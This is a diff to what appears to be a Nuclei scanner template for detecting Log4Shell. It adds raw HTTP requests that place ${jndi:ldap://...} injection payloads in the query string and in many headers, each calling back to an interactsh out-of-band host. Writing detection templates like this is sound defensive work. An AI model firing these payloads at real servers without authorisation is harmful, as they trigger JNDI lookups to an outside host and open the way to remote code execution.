@@ -15,21 +15,21 @@ info:
 requests:
   - raw:
       - |
-        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
         Host: {{Hostname}}
         Accept: ${jndi:ldap://localhost#{{Host}}.accept.{{interactsh-url}}}
         Accept-Encoding: ${jndi:ldap://localhost#{{Host}}.acceptencoding.{{interactsh-url}}}
         Accept-Language: ${jndi:ldap://localhost#{{Host}}.acceptlanguage.{{interactsh-url}}}
 
       - |
-        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
         Host: {{Hostname}}
         X-CSRF-Token: ${jndi:ldap://localhost#{{Host}}.xcsrftoken.{{interactsh-url}}}
         X-Druid-Comment: ${jndi:ldap://localhost#{{Host}}.xdruidcomment.{{interactsh-url}}}
         X-Forwarded-For: ${jndi:ldap://localhost#{{Host}}.xforwardedfor.{{interactsh-url}}}
 
       - |
-        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
         Host: {{Hostname}}
         Referer: ${jndi:ldap://localhost#{{Host}}.referer.{{interactsh-url}}}
         Upgrade-Insecure-Requests: ${jndi:ldap://localhost#{{Host}}.upgradeinsecurerequests.{{interactsh-url}}}
@@ -37,7 +37,7 @@ requests:
         X-Api-Version: ${jndi:ldap://localhost#{{Host}}.xapiversion.{{interactsh-url}}}
 
       - |
-        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
         Host: {{Hostname}}
         Authentication: Bearer ${jndi:ldap://localhost#{{Host}}.authenticationbearer.{{interactsh-url}}}
         Cookie: ${jndi:ldap://localhost#{{Host}}.cookiename.{{interactsh-url}}}=${jndi:ldap://{{Host}}.cookievalue.{{interactsh-url}}}
@@ -45,18 +45,61 @@ requests:
         Origin: ${jndi:ldap://localhost#{{Host}}.origin.{{interactsh-url}}}
 
       - |
-        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
         Host: {{Hostname}}
         Access-Control-Request-Headers: ${jndi:ldap://localhost#{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}}
         Access-Control-Request-Method: ${jndi:ldap://localhost#{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}}
         Authentication: Basic ${jndi:ldap://localhost#{{Host}}.authenticationbasic.{{interactsh-url}}}
         
       - |
-        GET /?x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
         Host: {{Hostname}}
         X-Origin: ${jndi:ldap://localhost#{{Host}}.xorigin.{{interactsh-url}}}
         If-Modified-Since: ${jndi:ldap://localhost#{{Host}}.ifmodifieds.{{interactsh-url}}}
+
+
+      - |
+        GET /xy4?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: ${jndi:ldap://localhost#{{Host}}.accept.{{interactsh-url}}}
+        Accept-Encoding: ${jndi:ldap://localhost#{{Host}}.acceptencoding.{{interactsh-url}}}
+        Accept-Language: ${jndi:ldap://localhost#{{Host}}.acceptlanguage.{{interactsh-url}}}
+
+      - |
+        GET /xy4?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+        X-CSRF-Token: ${jndi:ldap://localhost#{{Host}}.xcsrftoken.{{interactsh-url}}}
+        X-Druid-Comment: ${jndi:ldap://localhost#{{Host}}.xdruidcomment.{{interactsh-url}}}
+        X-Forwarded-For: ${jndi:ldap://localhost#{{Host}}.xforwardedfor.{{interactsh-url}}}
+
+      - |
+        GET /xy4?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+        Referer: ${jndi:ldap://localhost#{{Host}}.referer.{{interactsh-url}}}
+        Upgrade-Insecure-Requests: ${jndi:ldap://localhost#{{Host}}.upgradeinsecurerequests.{{interactsh-url}}}
+        User-Agent: ${jndi:ldap://localhost#{{Host}}.useragent.{{interactsh-url}}}
+        X-Api-Version: ${jndi:ldap://localhost#{{Host}}.xapiversion.{{interactsh-url}}}
+
+      - |
+        GET /xy4?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+        Authentication: Bearer ${jndi:ldap://localhost#{{Host}}.authenticationbearer.{{interactsh-url}}}
+        Cookie: ${jndi:ldap://localhost#{{Host}}.cookiename.{{interactsh-url}}}=${jndi:ldap://{{Host}}.cookievalue.{{interactsh-url}}}
+        Location: ${jndi:ldap://localhost#{{Host}}.location.{{interactsh-url}}}
+        Origin: ${jndi:ldap://localhost#{{Host}}.origin.{{interactsh-url}}}
+
+      - |
+        GET /xy4?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+        Access-Control-Request-Headers: ${jndi:ldap://localhost#{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}}
+        Access-Control-Request-Method: ${jndi:ldap://localhost#{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}}
+        Authentication: Basic ${jndi:ldap://localhost#{{Host}}.authenticationbasic.{{interactsh-url}}}
         
+      - |
+        GET /xy4?auth=1&res=js&x=${jndi:ldap://localhost%23{{Host}}.{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Origin: ${jndi:ldap://localhost#{{Host}}.xorigin.{{interactsh-url}}}
+        If-Modified-Since: ${jndi:ldap://localhost#{{Host}}.ifmodifieds.{{interactsh-url}}}
 
     matchers-condition: and
     matchers:
